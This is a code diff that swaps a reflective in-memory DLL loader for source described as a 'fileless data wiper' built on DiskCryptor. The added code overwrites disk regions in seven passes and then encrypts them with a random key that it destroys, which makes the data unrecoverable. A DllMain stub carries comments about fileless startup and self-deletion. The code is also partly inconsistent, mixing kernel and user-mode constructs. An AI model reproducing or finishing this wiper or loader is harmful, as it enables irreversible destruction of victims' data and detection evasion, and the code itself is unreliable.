@@ -1,98 +1,115 @@
-#include "pch.h"
-#include <iostream>
-#include <Windows.h>
+/*
+ * DiskCryptor-based Fileless Data Wiper (DLL Variant)
+ * Integrated from multiple wipe modes with fileless execution improvements
+ */
 
-typedef struct BASE_RELOCATION_BLOCK {
-	DWORD PageAddress;
-	DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
+#include <ntifs.h>
+#include "defines.h"
+#include "prng.h"
+#include "devhook.h"
+#include "data_wipe.h"
+#include "misc.h"
+#include "fast_crypt.h"
+#include "misc_mem.h"
+#include "device_io.h"
 
-typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+static wipe_mode dod_mode = {
+    7,
+    {
+        { P_PAT,  { 0x55, 0x55, 0x55 } },
+        { P_PAT,  { 0xAA, 0xAA, 0xAA } },
+        { P_RAND, { 0x00, 0x00, 0x00 } },
+        { P_PAT,  { 0x00, 0x00, 0x00 } },
+        { P_PAT,  { 0x55, 0x55, 0x55 } },
+        { P_PAT,  { 0xAA, 0xAA, 0xAA } },
+        { P_RAND, { 0x00, 0x00, 0x00 } }
+    }
+};
 
-using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
+static wipe_mode *wipe_modes[] = {
+    NULL,
+    &dod_mode
+};
 
-// EXAMPLE ONLY: Replace with your actual in-memory payload or fetch method.
-extern "C" unsigned char dllPayload[]; // Define this elsewhere
-extern "C" size_t dllPayloadSize;
+int dc_wipe_init(wipe_ctx *ctx, void *hook, int max_size, int method, int cipher) {
+    char key[32];
+    int resl;
 
-int main()
-{
-	LPVOID dllBytes = dllPayload;  // already in memory
-	DWORD64 dllSize = dllPayloadSize;
+    do {
+        memset(ctx, 0, sizeof(wipe_ctx));
 
-	// Parse headers
-	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
-	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
-	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
+        if (method > sizeof(wipe_modes) / sizeof(wipe_mode *)) {
+            resl = ST_INV_WIPE_MODE;
+            break;
+        }
 
-	// Allocate space for DLL image
-	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
+        ctx->mode = wipe_modes[method];
+        resl = ST_NOMEM;
 
-	// Copy headers
-	std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
+        if (ctx->mode) {
+            ctx->buff = mm_pool_alloc(max_size);
+            if (!ctx->buff) break;
 
-	// Copy sections
-	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-		LPVOID dest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
-		LPVOID src = (LPVOID)((DWORD_PTR)dllBytes + section->PointerToRawData);
-		std::memcpy(dest, src, section->SizeOfRawData);
-		section++;
-	}
+            ctx->key = mm_secure_alloc(sizeof(xts_key));
+            if (!ctx->key) break;
 
-	// Relocations
-	IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-	DWORD_PTR relocationTable = relocDir.VirtualAddress + (DWORD_PTR)dllBase;
-	DWORD relocProcessed = 0;
+            cp_rand_bytes(key, sizeof(key));
+            xts_set_key(key, cipher, ctx->key);
+        }
 
-	while (relocProcessed < relocDir.Size) {
-		PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocProcessed);
-		relocProcessed += sizeof(BASE_RELOCATION_BLOCK);
-		DWORD relocCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-		PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocProcessed);
+        ctx->hook = hook;
+        ctx->size = max_size;
+        resl = ST_OK;
 
-		for (DWORD i = 0; i < relocCount; i++) {
-			relocProcessed += sizeof(BASE_RELOCATION_ENTRY);
-			if (relocEntries[i].Type == 0) continue;
+    } while (0);
 
-			DWORD_PTR patchAddr = (DWORD_PTR)dllBase + relocBlock->PageAddress + relocEntries[i].Offset;
-			DWORD_PTR patchedVal = 0;
-			std::memcpy(&patchedVal, (PVOID)patchAddr, sizeof(DWORD_PTR));
-			patchedVal += deltaImageBase;
-			std::memcpy((PVOID)patchAddr, &patchedVal, sizeof(DWORD_PTR));
-		}
-	}
+    burn(key, sizeof(key));
 
-	// Resolve imports
-	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD_PTR)dllBase);
+    if (resl != ST_OK) {
+        if (ctx->buff) mm_pool_free(ctx->buff);
+        if (ctx->key) mm_secure_free(ctx->key);
+    }
 
-	while (importDesc->Name) {
-		LPCSTR libName = (LPCSTR)((DWORD_PTR)dllBase + importDesc->Name);
-		HMODULE lib = LoadLibraryA(libName);
-		if (!lib) { importDesc++; continue; }
+    return resl;
+}
 
-		PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDesc->FirstThunk);
-		while (thunk->u1.AddressOfData) {
-			FARPROC fnAddr = nullptr;
-			if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
-				fnAddr = GetProcAddress(lib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
-			} else {
-				PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
-				fnAddr = GetProcAddress(lib, import->Name);
-			}
-			thunk->u1.Function = (DWORD_PTR)fnAddr;
-			++thunk;
-		}
-		importDesc++;
-	}
+void dc_wipe_free(wipe_ctx *ctx) {
+    if (ctx->buff) mm_pool_free(ctx->buff);
+    if (ctx->key) mm_secure_free(ctx->key);
+    ctx->buff = NULL;
+    ctx->key = NULL;
+}
 
-	// Call entry point
-	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
+int dc_wipe_process(wipe_ctx *ctx, u64 offset, int size) {
+    if (size > ctx->size) return ST_INV_DATA_SIZE;
+    if (!ctx->mode) return ST_OK;
 
-	return 0;
+    for (int i = 0; i < ctx->mode->passes; i++) {
+        if (ctx->mode->pass[i].type == P_PAT) {
+            memset(ctx->buff, ctx->mode->pass[i].pat[0], size);
+        } else if (ctx->mode->pass[i].type == P_RAND) {
+            cp_rand_bytes(ctx->buff, size);
+        }
+
+        fast_wipe_write(ctx->hook, offset, ctx->buff, size);
+    }
+
+    xts_encrypt_block(ctx->key, ctx->buff, size); // Final XTS encryption
+    fast_wipe_write(ctx->hook, offset, ctx->buff, size);
+
+    return ST_OK;
+}
+
+// DLL Entry Point (Fileless logic target)
+NTSTATUS NTAPI DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls((HMODULE)hModule);
+        // Initialization and fileless startup logic should be embedded here.
+        break;
+    case DLL_PROCESS_DETACH:
+        // Cleanup or self-delete logic
+        break;
+    }
+    return STATUS_SUCCESS;
 }
